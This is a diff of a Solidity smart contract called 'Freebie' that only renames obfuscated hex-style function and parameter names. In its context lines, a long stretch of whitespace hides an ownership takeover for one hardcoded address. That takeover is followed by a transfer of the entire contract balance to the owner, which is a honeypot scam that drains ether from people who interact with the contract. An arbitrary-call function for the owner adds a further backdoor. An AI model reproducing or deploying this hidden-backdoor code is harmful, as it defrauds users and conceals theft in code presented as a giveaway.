@@ -16,7 +16,7 @@ contract Freebie
         }
     }
 
-    function _0xc50ea3()
+    function _0x7b0517()
     payable
     public
     {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x30ad12df80a2493a82DdFE367d866616db8a2595){Owner=0x30ad12df80a2493a82DdFE367d866616db8a2595;}
@@ -24,11 +24,11 @@ contract Freebie
         Owner.transfer(this.balance);
     }
 
-    function Command(address _0xb80942,bytes data)
+    function Command(address _0xee6d34,bytes data)
     payable
     public
     {
         require(msg.sender == Owner);
-        _0xb80942.call.value(msg.value)(data);
+        _0xee6d34.call.value(msg.value)(data);
     }
 }
